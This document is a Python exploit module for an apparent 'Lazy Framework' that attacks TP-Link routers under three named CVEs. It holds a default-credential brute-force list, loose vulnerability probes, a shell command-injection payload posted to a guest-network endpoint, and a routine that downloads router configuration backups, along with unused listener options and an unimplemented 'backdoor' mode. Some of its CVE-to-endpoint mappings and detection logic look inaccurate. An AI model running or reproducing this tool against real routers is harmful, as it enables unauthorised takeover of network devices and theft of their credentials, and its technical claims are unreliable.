#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
TP-Link Router Multiple Vulnerabilities Exploit
CVE-2023-1389, CVE-2021-27246, CVE-2020-35576
"""

import requests
import socket
import time
import base64
import hashlib
from pathlib import Path

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.syntax import Syntax
    console = Console()
except ImportError:
    class SimpleConsole:
        def print(self, msg): 
            print(msg)
    console = SimpleConsole()

import urllib3
urllib3.disable_warnings()

MODULE_INFO = {
    "name": "TP-Link Multi-Exploit",
    "description": "Multiple CVEs for TP-Link routers (CVE-2023-1389, CVE-2021-27246)",
    "author": "Lazy Framework Team",
    "license": "MIT", 
    "platform": "linux",
    "arch": "mips,arm",
    "rank": "High",
    "references": [
        "CVE-2023-1389",
        "CVE-2021-27246", 
        "CVE-2020-35576"
    ],
    "dependencies": ["requests"]
}

OPTIONS = {
    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.0.1"},
    "RPORT": {"description": "Web port", "required": False, "default": "80"},
    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
    "USERNAME": {"description": "Username", "required": False, "default": "admin"},
    "PASSWORD": {"description": "Password", "required": False, "default": "admin"},
    "MODE": {
        "description": "Exploit mode", 
        "required": False,
        "default": "detect",
        "choices": ["detect", "rce", "backdoor", "credentials", "dump", "persistence"]
    },
    "CMD": {"description": "Command to execute", "required": False, "default": "id"},
    "LHOST": {"description": "Listener IP", "required": False, "default": "10.0.0.1"},
    "LPORT": {"description": "Listener port", "required": False, "default": "4444"},
}

# TP-Link Default Credentials
TP_LINK_CREDS = [
    ("admin", "admin"),
    ("admin", "password"), 
    ("admin", "1234"),
    ("root", "admin"),
    ("root", "1234"),
    ("user", "user"),
    ("", ""),  # No auth
]

# TP-Link Router Models
TP_LINK_MODELS = [
    "archer", "tl-wr", "tl-mr", "tl-r", "tl-er", "eap", "omada",
    "c20", "c50", "c80", "a6", "a7", "a9", "ax10", "ax20", "ax50"
]

class TPLinkExploit:
    def __init__(self, target, port=80, proto="http", username="admin", password="admin"):
        self.target = target
        self.port = port
        self.proto = proto
        self.username = username
        self.password = password
        self.base_url = f"{proto}://{target}:{port}"
        self.session = requests.Session()
        if proto == "https":
            self.session.verify = False
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Referer': f'{self.base_url}/'
        })
    
    def detect_device(self):
        """Detect TP-Link router and model"""
        console.print("\n[bold yellow]=== TP-Link DETECTION ===[/bold yellow]")
        
        try:
            # Test web interface
            r = self.session.get(f"{self.base_url}/", timeout=10)
            html_content = r.text.lower()
            
            # Check for TP-Link signatures
            tplink_detected = False
            model = "Unknown"
            
            for signature in TP_LINK_MODELS:
                if signature in html_content:
                    tplink_detected = True
                    model = signature.upper()
                    break
            
            if "tplink" in html_content or "tp-link" in html_content:
                tplink_detected = True
                model = "TP-Link Generic"
            
            if tplink_detected:
                console.print(f"[green]✓ TP-Link router detected: {model}[/green]")
                
                # Test vulnerabilities
                vuln_status = self.test_vulnerabilities()
                return {
                    'is_tplink': True,
                    'model': model,
                    'vulnerable': vuln_status['vulnerable'],
                    'vulnerabilities': vuln_status['found']
                }
            else:
                console.print("[red]✗ Not a TP-Link router[/red]")
                return {'is_tplink': False}
                
        except Exception as e:
            console.print(f"[red]✗ Detection failed: {str(e)}[/red]")
            return {'is_tplink': False}
    
    def test_vulnerabilities(self):
        """Test for multiple TP-Link vulnerabilities"""
        console.print("[bold yellow][*] Testing for vulnerabilities...[/bold yellow]")
        
        vulnerabilities = {
            'CVE-2023-1389': False,  # RCE via guest network
            'CVE-2021-27246': False, # RCE via MAC filtering
            'CVE-2020-35576': False, # Info disclosure
            'found': []
        }
        
        try:
            # Test CVE-2023-1389 - RCE via guest network
            test_url = f"{self.base_url}/cgi-bin/luci/;stok=/guest-network/network"
            r = self.session.get(test_url, timeout=10)
            if r.status_code != 404:
                vulnerabilities['CVE-2023-1389'] = True
                vulnerabilities['found'].append('CVE-2023-1389')
                console.print("[green]✓ CVE-2023-1389 (RCE) potentially vulnerable[/green]")
            
            # Test CVE-2021-27246 - RCE via MAC filtering
            test_url = f"{self.base_url}/cgi-bin/luci/;stok=/admin/wireless/mac-filter"
            r = self.session.get(test_url, timeout=10)
            if r.status_code != 404:
                vulnerabilities['CVE-2021-27246'] = True
                vulnerabilities['found'].append('CVE-2021-27246')
                console.print("[green]✓ CVE-2021-27246 (RCE) potentially vulnerable[/green]")
            
            # Test CVE-2020-35576 - Info disclosure
            test_url = f"{self.base_url}/cgi-bin/luci/"
            r = self.session.get(test_url, timeout=10)
            if "password" in r.text and r.status_code == 200:
                vulnerabilities['CVE-2020-35576'] = True
                vulnerabilities['found'].append('CVE-2020-35576')
                console.print("[green]✓ CVE-2020-35576 (Info Disclosure) potentially vulnerable[/green]")
            
            vulnerabilities['vulnerable'] = len(vulnerabilities['found']) > 0
            return vulnerabilities
            
        except Exception as e:
            console.print(f"[red]✗ Vulnerability test failed: {str(e)}[/red]")
            return vulnerabilities
    
    def exploit_cve_2023_1389(self, command):
        """Exploit CVE-2023-1389 - RCE via guest network"""
        console.print("[bold yellow][*] Exploiting CVE-2023-1389...[/bold yellow]")
        
        try:
            # First get valid credentials
            if not self.authenticate():
                console.print("[red]✗ Authentication failed[/red]")
                return False
            
            # Exploit via guest network configuration
            payload = {
                'ssid': 'test',
                'encryption': 'none', 
                'key': f'";{command};echo "',
                'enable': '1'
            }
            
            exploit_url = f"{self.base_url}/cgi-bin/luci/;stok={self.stok}/guest-network/network"
            r = self.session.post(exploit_url, data=payload, timeout=10)
            
            if r.status_code == 200:
                console.print("[green]✓ Command execution attempted[/green]")
                return True
            else:
                console.print(f"[red]✗ Exploit failed (HTTP {r.status_code})[/red]")
                return False
                
        except Exception as e:
            console.print(f"[red]✗ Exploit error: {str(e)}[/red]")
            return False
    
    def authenticate(self):
        """Authenticate to TP-Link router"""
        console.print("[bold yellow][*] Attempting authentication...[/bold yellow]")
        
        for username, password in TP_LINK_CREDS:
            try:
                # Try login endpoint
                login_url = f"{self.base_url}/cgi-bin/luci/"
                login_data = {
                    'username': username,
                    'password': password,
                    'operation': 'login'
                }
                
                r = self.session.post(login_url, data=login_data, timeout=10)
                
                if 'success' in r.text.lower() or 'stok' in r.text:
                    self.stok = self.extract_stok(r.text)
                    console.print(f"[green]✓ Authenticated with {username}:{password}[/green]")
                    return True
                    
            except Exception as e:
                continue
        
        console.print("[red]✗ All authentication attempts failed[/red]")
        return False
    
    def extract_stok(self, response_text):
        """Extract stok token from response"""
        import re
        match = re.search(r'"stok":"([^"]+)"', response_text)
        if match:
            return match.group(1)
        return None
    
    def dump_credentials(self):
        """Dump router credentials and configuration"""
        console.print("[bold yellow][*] Dumping credentials...[/bold yellow]")
        
        try:
            # Try to access config file
            config_urls = [
                f"{self.base_url}/config.bin",
                f"{self.base_url}/backup.cfg", 
                f"{self.base_url}/romfile.cfg",
                f"{self.base_url}/userconfig.cfg"
            ]
            
            for url in config_urls:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.content) > 100:
                    console.print(f"[green]✓ Config file found: {url}[/green]")
                    
                    # Save config file
                    filename = f"tplink_config_{int(time.time())}.bin"
                    with open(filename, 'wb') as f:
                        f.write(r.content)
                    console.print(f"[green]✓ Config saved as: {filename}[/green]")
                    return True
            
            console.print("[red]✗ No config files found[/red]")
            return False
            
        except Exception as e:
            console.print(f"[red]✗ Credential dump failed: {str(e)}[/red]")
            return False

def run(session, options):
    """Main TP-Link exploit function"""
    console.print(Panel("TP-Link Router Exploit Framework", style="bold green"))
    
    # Extract options
    rhost = options.get("RHOST", "192.168.0.1")
    rport = options.get("RPORT", "80")
    proto = options.get("PROTO", "http")
    username = options.get("USERNAME", "admin")
    password = options.get("PASSWORD", "admin")
    mode = options.get("MODE", "detect")
    cmd = options.get("CMD", "id")
    lhost = options.get("LHOST", "10.0.0.1")
    lport = options.get("LPORT", "4444")
    
    console.print(f"[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
    console.print(f"[bold yellow][*] Mode: {mode.upper()}[/bold yellow]")
    
    try:
        exploit = TPLinkExploit(rhost, rport, proto, username, password)
        
        if mode == "detect":
            result = exploit.detect_device()
            if result['is_tplink']:
                console.print(f"\n[bold green]✓ TP-Link Device: {result['model']}[/bold green]")
                console.print(f"[bold cyan]Vulnerable: {result['vulnerable']}[/bold cyan]")
                if result['vulnerable']:
                    console.print(f"[bold yellow]Vulnerabilities: {', '.join(result['vulnerabilities'])}[/bold yellow]")
            else:
                console.print("[bold red]✗ Not a TP-Link device[/bold red]")
        
        elif mode == "rce":
            if exploit.authenticate():
                exploit.exploit_cve_2023_1389(cmd)
        
        elif mode == "credentials":
            exploit.dump_credentials()
        
        elif mode == "backdoor":
            console.print("[yellow][*] Backdoor feature not yet implemented[/yellow]")
        
        else:
            console.print(f"[red]Unknown mode: {mode}[/red]")
        
        return True
        
    except Exception as e:
        console.print(f"[bold red]✗ Error: {str(e)}[/bold red]")
        return False

def show_info():
    table = Table(show_header=False, box=None)
    table.add_column("Field", style="bold yellow")
    table.add_column("Value", style="white")
    table.add_row("Name", "TP-Link Multi-Exploit")
    table.add_row("CVEs", "2023-1389, 2021-27246, 2020-35576")
    table.add_row("Models", "Archer, TL-WR, TL-MR series")
    table.add_row("Risk", "High")
    console.print(Panel(table, title="TP-Link Exploit", border_style="green"))

def show_options(opts):
    table = Table(title="Options", box=None)
    table.add_column("Name", style="bold cyan")
    table.add_column("Value", style="green")
    table.add_column("Description", style="white")
    for k, v in opts.items():
        val = v.get('value', v.get('default', ''))
        table.add_row(k, str(val), v.get('description', ''))
    console.print(Panel(table, border_style="blue"))
